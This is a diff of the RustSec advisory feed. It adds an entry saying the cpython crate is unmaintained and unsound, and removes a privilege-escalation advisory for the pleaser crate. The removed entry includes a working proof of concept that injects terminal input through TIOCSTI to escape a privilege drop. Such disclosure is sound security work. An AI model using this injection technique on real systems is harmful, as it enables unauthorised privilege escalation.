@@ -129,6 +129,136 @@ platforms.&lt;/p&gt;
 
     
     &lt;/p&gt;
+  &lt;/article&gt;</content></entry><entry><title>RUSTSEC-2023-0076: cpython is unmaintained</title><id>https://rustsec.org/advisories/RUSTSEC-2023-0076.html</id><updated>2023-12-20T12:00:00+00:00</updated><link href="https://rustsec.org/advisories/RUSTSEC-2023-0076.html" rel="alternate" type="text/html" title="RUSTSEC-2023-0076: cpython is unmaintained"/><published>2023-12-20T12:00:00+00:00</published><summary xml:lang="en">`cpython` is unmaintained</summary><content xml:lang="en" type="html">  &lt;article&gt;
+    
+        &lt;span class=&quot;floating-menu&quot;&gt;
+          &lt;a href=&quot;https://github.com/RustSec/advisory-db/commits/main/crates/cpython/RUSTSEC-2023-0076.md&quot;&gt;History&lt;/a&gt; ⋅ 
+          &lt;a href=&quot;https://github.com/RustSec/advisory-db/edit/main/crates/cpython/RUSTSEC-2023-0076.md&quot;&gt;Edit&lt;/a&gt; ⋅
+          &lt;a href=&quot;https://api.osv.dev/v1/vulns/RUSTSEC-2023-0076&quot;&gt;JSON (OSV)&lt;/a&gt;
+        &lt;/span&gt;
+    
+
+    &lt;header&gt;
+      &lt;h1&gt;
+        
+        RUSTSEC-2023-0076
+        
+      &lt;/h1&gt;
+      &lt;span class=&quot;subtitle&quot;&gt;&lt;p&gt;&lt;code&gt;cpython&lt;/code&gt; is unmaintained&lt;/p&gt;
+&lt;/span&gt;
+    &lt;/header&gt;
+
+    
+
+    &lt;dl&gt;
+      &lt;dt id=&quot;reported&quot;&gt;Reported&lt;/dt&gt;
+      &lt;dd&gt;
+        &lt;time datetime=&quot;2023-11-14&quot;&gt;
+          November 14, 2023
+        &lt;/time&gt;
+      &lt;/dd&gt;
+
+      &lt;dt id=&quot;issued&quot;&gt;Issued&lt;/dt&gt;
+      &lt;dd&gt;
+        &lt;time datetime=&quot;2023-12-20&quot;&gt;
+          December 20, 2023
+        &lt;/time&gt;
+        
+      &lt;/dd&gt;
+
+      &lt;dt id=&quot;package&quot;&gt;Package&lt;/dt&gt;
+      &lt;dd&gt;
+        
+        
+        &lt;a href=&quot;/packages/cpython.html&quot;&gt;cpython&lt;/a&gt;
+          (&lt;a href=&quot;https://crates.io/crates/cpython&quot;&gt;crates.io&lt;/a&gt;)
+        
+        
+      &lt;/dd&gt;
+
+      &lt;dt id=&quot;type&quot;&gt;Type&lt;/dt&gt;
+      &lt;dd&gt;
+        
+        &lt;span class=&quot;tag info&quot;&gt;INFO&lt;/span&gt;
+        Unmaintained
+        
+      &lt;/dd&gt;
+
+      
+
+      
+
+      
+
+      
+      &lt;dt id=&quot;details&quot;&gt;References&lt;/dt&gt;
+      &lt;dd&gt;
+        &lt;ul&gt;
+        
+          &lt;li&gt;
+            &lt;a href=&quot;https://github.com/dgrunwald/rust-cpython/commit/e815555&quot;&gt;
+              https://github.com/dgrunwald/rust-cpython/commit/e815555
+            &lt;/a&gt;
+          &lt;/li&gt;
+        
+        
+          &lt;li&gt;
+            &lt;a href=&quot;https://github.com/dgrunwald/rust-cpython/issues/265&quot;&gt;
+              https://github.com/dgrunwald/rust-cpython/issues/265
+            &lt;/a&gt;
+          &lt;/li&gt;
+        
+          &lt;li&gt;
+            &lt;a href=&quot;https://github.com/dgrunwald/rust-cpython/issues/294&quot;&gt;
+              https://github.com/dgrunwald/rust-cpython/issues/294
+            &lt;/a&gt;
+          &lt;/li&gt;
+        
+        &lt;/ul&gt;
+      &lt;/dd&gt;
+      
+
+      
+
+      
+      
+
+      &lt;dt id=&quot;patched&quot;&gt;Patched&lt;/dt&gt;
+      &lt;dd&gt;
+        
+        no patched versions
+        
+      &lt;/dd&gt;
+
+      
+
+      
+      
+    &lt;/dl&gt;
+
+    
+    
+
+    &lt;h3 id=&quot;description&quot;&gt;Description&lt;/h3&gt;
+    &lt;p&gt;The &lt;code&gt;cpython&lt;/code&gt; crate and the underlying &lt;code&gt;python3-sys&lt;/code&gt; and &lt;code&gt;python27-sys&lt;/code&gt; crates have been marked as &lt;a href=&quot;https://github.com/dgrunwald/rust-cpython/commit/e815555&quot;&gt;no longer actively maintained&lt;/a&gt; by the developer.&lt;/p&gt;
+&lt;p&gt;There are also open issues for unsound code that is currently in these crates:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://github.com/dgrunwald/rust-cpython/issues/265&quot;&gt;cpython#265&lt;/a&gt;: Using some string functions causes segmentation faults on big-endian architectures. Due to incorrect bitfield manipulations, it is possible to create invalid Python objects that crash the Python interpreter.&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://github.com/dgrunwald/rust-cpython/issues/294&quot;&gt;cpython#294&lt;/a&gt;: Python 3.12 is not supported. Due to ABI changes in Python 3.12, calling some string functions will result in invalid Python objects and / or cause out-of-bounds memory accesses.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;Recommended alternatives&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://crates.io/crates/pyo3&quot;&gt;&lt;code&gt;pyo3&lt;/code&gt;&lt;/a&gt; (version 0.19.2 and newer)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The &lt;code&gt;pyo3&lt;/code&gt; crate is actively maintained. Preliminary support for Python 3.12 was added in version 0.19.2, and version 0.20.0 was released with full support for Python 3.12.&lt;/p&gt;
+&lt;p&gt;Both versions implement string functions correctly on big-endian architectures. The endianness issue affecting the &lt;code&gt;cpython&lt;/code&gt; crate was fixed in recent versions of &lt;code&gt;pyo3&lt;/code&gt;.&lt;/p&gt;
+
+
+    &lt;p id=&quot;license&quot; class=&quot;license&quot;&gt;Advisory available under &lt;a href=&quot;https://spdx.org/licenses/CC0-1.0.html&quot;&gt;CC0-1.0&lt;/a&gt;
+    license.
+
+    
+    &lt;/p&gt;
   &lt;/article&gt;</content></entry><entry><title>RUSTSEC-2023-0074: Vulnerability in zerocopy</title><id>https://rustsec.org/advisories/RUSTSEC-2023-0074.html</id><updated>2023-12-18T12:00:00+00:00</updated><link href="https://rustsec.org/advisories/RUSTSEC-2023-0074.html" rel="alternate" type="text/html" title="RUSTSEC-2023-0074: Vulnerability in zerocopy"/><published>2023-12-18T12:00:00+00:00</published><summary xml:lang="en">Some Ref methods are unsound with some type parameters</summary><content xml:lang="en" type="html">  &lt;article&gt;
     
         &lt;span class=&quot;floating-menu&quot;&gt;
@@ -1665,213 +1795,6 @@ let _ = cocoon.encrypt(&amp;amp;mut data2)?;
     &lt;h3 id=&quot;description&quot;&gt;Description&lt;/h3&gt;
     &lt;p&gt;The &lt;a href=&quot;https://crates.io/crates/fehler&quot;&gt;&lt;code&gt;fehler&lt;/code&gt;&lt;/a&gt; crate is no longer maintained.
 Consider using &lt;a href=&quot;https://crates.io/crates/culpa&quot;&gt;&lt;code&gt;culpa&lt;/code&gt;&lt;/a&gt; instead.&lt;/p&gt;
-
-
-    &lt;p id=&quot;license&quot; class=&quot;license&quot;&gt;Advisory available under &lt;a href=&quot;https://spdx.org/licenses/CC0-1.0.html&quot;&gt;CC0-1.0&lt;/a&gt;
-    license.
-
-    
-    &lt;/p&gt;
-  &lt;/article&gt;</content></entry><entry><title>RUSTSEC-2023-0066: Vulnerability in pleaser</title><id>https://rustsec.org/advisories/RUSTSEC-2023-0066.html</id><updated>2023-10-28T12:00:00+00:00</updated><category term="privilege-escalation"/><link href="https://rustsec.org/advisories/RUSTSEC-2023-0066.html" rel="alternate" type="text/html" title="RUSTSEC-2023-0066: Vulnerability in pleaser"/><published>2023-10-03T12:00:00+00:00</published><summary xml:lang="en">Vulnerable to privilege escalation using ioctls TIOCSTI and TIOCLINUX</summary><content xml:lang="en" type="html">  &lt;article&gt;
-    
-        &lt;span class=&quot;floating-menu&quot;&gt;
-          &lt;a href=&quot;https://github.com/RustSec/advisory-db/commits/main/crates/pleaser/RUSTSEC-2023-0066.md&quot;&gt;History&lt;/a&gt; ⋅ 
-          &lt;a href=&quot;https://github.com/RustSec/advisory-db/edit/main/crates/pleaser/RUSTSEC-2023-0066.md&quot;&gt;Edit&lt;/a&gt; ⋅
-          &lt;a href=&quot;https://api.osv.dev/v1/vulns/RUSTSEC-2023-0066&quot;&gt;JSON (OSV)&lt;/a&gt;
-        &lt;/span&gt;
-    
-
-    &lt;header&gt;
-      &lt;h1&gt;
-        
-        RUSTSEC-2023-0066
-        
-      &lt;/h1&gt;
-      &lt;span class=&quot;subtitle&quot;&gt;&lt;p&gt;Vulnerable to privilege escalation using ioctls TIOCSTI and TIOCLINUX&lt;/p&gt;
-&lt;/span&gt;
-    &lt;/header&gt;
-
-    
-
-    &lt;dl&gt;
-      &lt;dt id=&quot;reported&quot;&gt;Reported&lt;/dt&gt;
-      &lt;dd&gt;
-        &lt;time datetime=&quot;2023-04-29&quot;&gt;
-          April 29, 2023
-        &lt;/time&gt;
-      &lt;/dd&gt;
-
-      &lt;dt id=&quot;issued&quot;&gt;Issued&lt;/dt&gt;
-      &lt;dd&gt;
-        &lt;time datetime=&quot;2023-10-03&quot;&gt;
-          October  3, 2023
-        &lt;/time&gt;
-        
-        &lt;time datetime=&quot;2023-10-28&quot;&gt;
-          (last modified: October 28, 2023)
-        &lt;/time&gt;
-        
-      &lt;/dd&gt;
-
-      &lt;dt id=&quot;package&quot;&gt;Package&lt;/dt&gt;
-      &lt;dd&gt;
-        
-        
-        &lt;a href=&quot;/packages/pleaser.html&quot;&gt;pleaser&lt;/a&gt;
-          (&lt;a href=&quot;https://crates.io/crates/pleaser&quot;&gt;crates.io&lt;/a&gt;)
-        
-        
-      &lt;/dd&gt;
-
-      &lt;dt id=&quot;type&quot;&gt;Type&lt;/dt&gt;
-      &lt;dd&gt;
-        
-        Vulnerability
-        
-      &lt;/dd&gt;
-
-      
-      &lt;dt id=&quot;categories&quot;&gt;Categories&lt;/dt&gt;
-      &lt;dd&gt;
-        &lt;ul&gt;
-          
-          &lt;li&gt;&lt;a href=&quot;/categories/privilege-escalation.html&quot;&gt;privilege-escalation&lt;/a&gt;&lt;/li&gt;
-          
-        &lt;/ul&gt;
-      &lt;/dd&gt;
-      
-
-      
-
-      
-      &lt;dt id=&quot;aliases&quot;&gt;Aliases&lt;/dt&gt;
-      &lt;dd&gt;
-        &lt;ul&gt;
-          
-          &lt;li&gt;
-            
-            &lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-46277&quot;&gt;CVE-2023-46277&lt;/a&gt;
-            
-          &lt;/li&gt;
-          
-        &lt;/ul&gt;
-      &lt;/dd&gt;
-      
-
-      
-      &lt;dt id=&quot;details&quot;&gt;References&lt;/dt&gt;
-      &lt;dd&gt;
-        &lt;ul&gt;
-        
-          &lt;li&gt;
-            &lt;a href=&quot;https://gitlab.com/edneville/please/-/issues/13&quot;&gt;
-              https://gitlab.com/edneville/please/-/issues/13
-            &lt;/a&gt;
-          &lt;/li&gt;
-        
-        
-        &lt;/ul&gt;
-      &lt;/dd&gt;
-      
-
-      
-
-      
-      &lt;dt id=&quot;cvss_score&quot;&gt;CVSS Score&lt;/dt&gt;
-      &lt;dd&gt;4.6 &lt;span class=&quot;tag medium&quot;&gt;
-        MEDIUM
-      &lt;/span&gt;&lt;/dd&gt;
-
-      &lt;dt id=&quot;cvss_details&quot;&gt;CVSS Details&lt;/dt&gt;
-      &lt;dd&gt;
-        &lt;dl&gt;
-          
-          &lt;dt&gt;Attack vector&lt;/dt&gt;&lt;dd&gt;Local&lt;/dd&gt;
-          
-
-          
-          &lt;dt&gt;Attack complexity&lt;/dt&gt;&lt;dd&gt;Low&lt;/d&gt;
-          
-
-          
-          &lt;dt&gt;Privileges required&lt;/dt&gt;&lt;dd&gt;Low&lt;/dd&gt;
-          
-
-          
-          &lt;dt&gt;User interaction&lt;/dt&gt;&lt;dd&gt;Required&lt;/dd&gt;
-          
-
-          
-          &lt;dt&gt;Scope&lt;/dt&gt;&lt;dd&gt;Changed&lt;/dd&gt;
-          
-
-          
-          &lt;dt&gt;Confidentiality&lt;/dt&gt;&lt;dd&gt;Low&lt;/dd&gt;
-          
-
-          
-          &lt;dt&gt;Integrity&lt;/dt&gt;&lt;dd&gt;Low&lt;/dd&gt;
-          
-
-          
-          &lt;dt&gt;Availability&lt;/dt&gt;&lt;dd&gt;None&lt;/dd&gt;
-          
-        &lt;/dl&gt;
-      &lt;/dd&gt;
-
-      &lt;dt id=&quot;cvss&quot;&gt;CVSS Vector&lt;/dt&gt;
-      &lt;dd&gt;&lt;a href=&quot;https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N&quot;&gt;CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N&lt;/a&gt;&lt;/dd&gt;
-
-      
-
-      &lt;dt id=&quot;patched&quot;&gt;Patched&lt;/dt&gt;
-      &lt;dd&gt;
-        
-        no patched versions
-        
-      &lt;/dd&gt;
-
-      
-
-      
-      
-
-      
-      
-    &lt;/dl&gt;
-
-    
-    
-
-    
-
-    &lt;h3 id=&quot;description&quot;&gt;Description&lt;/h3&gt;
-    &lt;p&gt;please is vulnerable to privilege escalation using ioctls TIOCSTI
-and TIOCLINUX on systems where they are not disabled.&lt;/p&gt;
-&lt;p&gt;Here is how to see it in action:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;$ cd &amp;quot;$(mktemp -d)&amp;quot;
-$ git clone --depth 1 https://gitlab.com/edneville/please.git
-$ cd please/
-$ git rev-parse HEAD  # f3598f8fae5455a8ecf22afca19eaba7be5053c9
-$ cargo test &amp;amp;&amp;amp; cargo build --release
-$ echo &amp;quot;[${USER}_as_nobody]&amp;quot;$&apos;\nname=&apos;&amp;quot;${USER}&amp;quot;$&apos;\ntarget=nobody\nrule=.*\nrequire_pass=false&apos; | sudo tee /etc/please.ini
-$ sudo chown root:root ./target/release/please
-$ sudo chmod u+s ./target/release/please
-$ cat &amp;lt;&amp;lt;TIOCSTI_C_EOF | tee TIOCSTI.c
-#include &amp;lt;sys/ioctl.h&amp;gt;
-
-int main(void) {
-  const char *text = &amp;quot;id\n&amp;quot;;
-  while (*text)
-    ioctl(0, TIOCSTI, text++);
-  return 0;
-}
-TIOCSTI_C_EOF
-$ gcc -std=c99 -Wall -Wextra -pedantic -o /tmp/TIOCSTI TIOCSTI.c
-$ ./target/release/please -u nobody /tmp/TIOCSTI  # runs id(1) as ${USER} rather than nobody
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Please note that:&lt;/p&gt;
-&lt;p&gt;This affects both the case where root wants to drop privileges as well when non-root wants to gain other privileges.&lt;/p&gt;
 
 
     &lt;p id=&quot;license&quot; class=&quot;license&quot;&gt;Advisory available under &lt;a href=&quot;https://spdx.org/licenses/CC0-1.0.html&quot;&gt;CC0-1.0&lt;/a&gt;
